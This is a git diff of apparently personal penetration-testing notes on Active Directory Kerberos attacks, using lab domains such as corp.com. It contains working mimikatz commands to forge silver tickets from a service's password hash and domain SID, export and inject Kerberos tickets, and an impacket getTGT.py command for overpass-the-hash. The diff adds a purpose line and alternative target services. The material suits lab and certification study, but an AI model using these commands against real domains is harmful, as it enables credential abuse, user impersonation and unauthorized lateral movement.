@@ -254,12 +254,12 @@ sudo ntpdate -s domain
 ```
 ### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
 >Service hash required 
-
+>Purpose:forge TGS ticket of certain service
 >Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.5 With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.
 ```
 whoami /user
 kerberos::purge
-kerberos::golden /user:jeffadmin(impersonated user) /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part from whoami /user) /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(password hash of iis_service) /ptt
+kerberos::golden /user:jeffadmin(impersonated user) /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part from whoami /user) /target:CorpWebServer.corp.com /service:HTTP(CIFS|MSSQL|LDAP) /rc4:E2B475C11DA2A0748290D87AA966C327(password hash of iis_service) /ptt
 kerberos::list
 ```
 ```
@@ -299,7 +299,7 @@ sekurlsa::tickets /export (export all kirbi files)
 kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
 ```
 ### Overpass-the-hash
->transfer hash to kerberos ticket file, then authenticate as that user to move laterally
+>transfer hash to TGT ticket file, then authenticate as that user to move laterally
 ```
 # Request the TGT with hash
 python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
